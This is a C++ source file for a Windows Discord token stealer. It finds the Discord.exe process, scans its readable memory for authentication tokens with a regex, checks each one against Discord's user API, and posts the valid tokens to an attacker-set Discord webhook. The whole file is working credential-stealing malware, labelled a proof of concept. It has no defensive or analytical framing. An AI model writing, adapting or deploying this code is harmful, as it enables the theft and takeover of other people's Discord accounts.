// --- grabs discord tokens in virtual memory ---
// --- deps: libcurlx64 & nlohmannn::json
// --- rewrite in rust soon ---
#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <vector>
#include <regex>
#include <thread>
#include <cstdio>
#include <locale>
#include <codecvt>
#include <mutex>

#include <Windows.h>  // windows api
#include <winternl.h>
#include <TlHelp32.h>


#include <curl/curl.h>
#include <nlohmann/json.hpp>

// replace
std::string webhook_url = "";

// pre-compile regex pattern for speed efficiency               // 2 step mfs aswell
std::regex               filter_regex(R"([\w-]{24,26}\.[\w-]{6}\.[\w-]{34,38}|mfa\.[\w-]{84})");
std::mutex               match_mutex;
std::vector<std::string> tokens;

// webhook class
class Webhook {
public:
    std::string    url;
    std::string    avatar_url;
    nlohmann::json payload;

    // write callback for stdout
    static size_t write_callback(void* ptr, size_t size, size_t nmemb, void* data) {
        return size * nmemb;
    }

    bool verify_url(std::string url) {
        // function 2 verify webhook_url
        // initialize curl
        CURL* curl = curl_easy_init();
        // error handling
        if (curl) {
            // no headers just a get request.
            // add url to request
            curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, (*this).write_callback);
            curl_easy_setopt(curl, CURLOPT_VERBOSE, 0L); // turn on verbose stdout
            // perform request
            if (curl_easy_perform(curl) == 0)
            {
                curl_easy_cleanup(curl);
                return true;
            }
        }
        return false;
    }

    Webhook(std::string url, std::string username = "", std::string avatar_url = "") {
        // Discord webhook support
        if (!url.empty() && this->verify_url(url))
            this->url = url;

        if (!avatar_url.empty() && this->verify_url(avatar_url)) {
            // check url & add to instance/payload
            this->avatar_url            = avatar_url;
            this->payload["avatar_url"] = avatar_url;
        }
            
        if (!username.empty()) // add username 2 payload
            this->payload["username"] = username;
    }

    bool execute(std::string content) {
        // send payload 2 server
        CURL* curl = curl_easy_init();
        // check pointer
        if (curl) {
            // build payload
            this->payload["content"] = content;
            // build header chunk      // initialize empty pointer
            struct curl_slist* chunk = nullptr;
                               chunk = curl_slist_append(chunk, "content-type: application/json");
            // deserialize payload
            std::string cpayload = this->payload.dump();
            // finish building request
            curl_easy_setopt(curl, CURLOPT_URL, this->url.c_str());
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, cpayload.c_str());
            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);
            curl_easy_setopt(curl, CURLOPT_VERBOSE, 0L);

            if (curl_easy_perform(curl) == 0)
            {
                curl_easy_cleanup(curl);
                return true;
            }
        }
        return false;
    }
};


// grabbr class
class MemoryGrabber {
public:
    std::wstring process;
    int          match_count;
    DWORD        discord_process_id;
    // webhook support
    Webhook* webhook;

    // constructor
    MemoryGrabber(const std::wstring& process) {
        this->process     = process;
        this->match_count = 0;
        // new webhook object
        this->webhook = new Webhook(webhook_url, "@memory_grabber");
    }

    static std::string convert_wide_string(std::wstring& wide_string) {
        // convert wstring 2 std::string
        std::wstring_convert<std::codecvt_utf8<wchar_t>> convert;
        // lol
        return convert.to_bytes(wide_string);
    }

    static bool check_token(std::string token) {
        // check the matches found
        CURL* curl = curl_easy_init();

        if (curl) {
            // create header chunk
            struct curl_slist* chunk = nullptr;
            // header string
            // allocate buffer on the heap
            char* buffer = (char*)malloc(100 * sizeof(char));
            // format buffer string
            sprintf(buffer, "Authorization: %s", token.c_str());
            // build heaer chunk
            chunk = curl_slist_append(chunk, buffer);
            // build request
            curl_easy_setopt(curl, CURLOPT_URL, "https://discordapp.com/api/v9/users/@me");
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, Webhook::write_callback);
            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);
            curl_easy_setopt(curl, CURLOPT_VERBOSE, 0L);

            if (curl_easy_perform(curl) == 0) {
                // free mem on heap
                free(buffer);
                curl_easy_cleanup(curl);
                // token is valid
                return true;
            }
        }

        return false;
    }

    MemoryGrabber* get_process_by_name() {
        // find process via name: Discord.exe
        // new procEntry
        PROCESSENTRY32 pe32;
        // convert for debugging
        std::string narrow = this->convert_wide_string(this->process);
        // debugging
        std::cout << "[*] attempting to retrieve procID of " << narrow << std::endl;
        // create snapshot handle
        pe32.dwSize  = sizeof(PROCESSENTRY32);
        HANDLE hsnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        // check handle
        if (hsnap == INVALID_HANDLE_VALUE) {
            // dbg
            std::cerr << "[!] failed to create snapshot [!]" << std::endl;
            // close handle
            CloseHandle(hsnap);
            return this;
        }

        do {
            if (this->process == pe32.szExeFile) {
                // close handle & add procID 2 the instance
                CloseHandle(hsnap);
                // dbg
                std::cout << "[*] found process id: " << pe32.th32ProcessID << std::endl;
                // instance
                this->discord_process_id = pe32.th32ProcessID;

                return this;
            }
        } while (Process32Next(hsnap, &pe32));

        return this;
    }

    void process_memory_region(HANDLE process, BYTE* addr, SIZE_T region_size) {
        // vector 4 region_size
        std::vector<char> page(region_size);
        // read memory by chunk of bytes
        if (ReadProcessMemory(process, addr, page.data(), region_size, nullptr))
        { // convert memory 2 a string
            std::string str(page.begin(), page.end());
            // remove non-printable junk
            str.erase(std::remove_if(str.begin(), str.end(), [](unsigned char c) {
                return !std::isprint(c);
                }), str.end());
            // look 4 all possible matches within the string
            std::smatch matches;
            // set the beginnning
            auto begin = str.cbegin();
            // look through the matches
            while (std::regex_search(begin, str.cend(), matches, filter_regex))
            { // only print part of the match that has the token
                std::string token = matches.str();
                // lock for safe access
                std::lock_guard<std::mutex> lock(match_mutex);
                // check potential token
                auto iterator = std::find(tokens.begin(), tokens.end(), token);
                // check if token is in the vector
                if (iterator == tokens.end() && this->check_token(token))
                { // broadcast 2 server
                    std::cout << "[*] found token: " << token << std::endl;
                    // add to vector first
                    tokens.push_back(token);
                    // allocate char* buffer to send 2 server
                    char* buffer = (char*)malloc(200 * sizeof(char));
                    // format buffer
                    sprintf(buffer, "@everyone ```%s```", token.c_str());
                    // convert back
                    this->webhook->execute(buffer);
                    this->match_count++;
                    free(buffer);
                }
                // move the search start point
                begin = matches[0].second;
            }

        }
    }
    // function to scan proc memory in parallel
    MemoryGrabber* scan_process() {
        // mbi!!!
        MEMORY_BASIC_INFORMATION mbi;
        // open process for reading
        HANDLE process = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, this->discord_process_id);
        // check handle
        if (!process) {
            std::cout << "[!] failed to find process [!]" << std::endl;
            return this;
        }
        // stdout
        std::cout << "[*] scanning process memory... [*]" << std::endl;
        // loop thru memory
        for (BYTE* addr = nullptr; VirtualQueryEx(process, addr, &mbi, sizeof(mbi)) == sizeof(mbi); addr += mbi.RegionSize)
        { // read commited memory that is readable and writeable (skip no access regions, guard pages, etc.)
            if (mbi.State == MEM_COMMIT && (mbi.Protect & PAGE_READWRITE || mbi.Protect & PAGE_EXECUTE_READWRITE))
            {
                // std::cout << "[*] scanning region at address: " << static_cast<void*>(addr) << " of size: " << mbi.RegionSize << std::endl;
                // read parallel memory
                std::thread t(&MemoryGrabber::process_memory_region, this, process, addr, mbi.RegionSize);
                t.join(); // wait for last thread 2 finish
            }

        }
        CloseHandle(process);
        return this;
    }
};


int main()
{ // proof of concept
    MemoryGrabber* mem_grabbr = (new MemoryGrabber(L"Discord.exe"))->get_process_by_name()->scan_process();
    // free memory
    delete mem_grabbr->webhook;
    delete mem_grabbr;
}
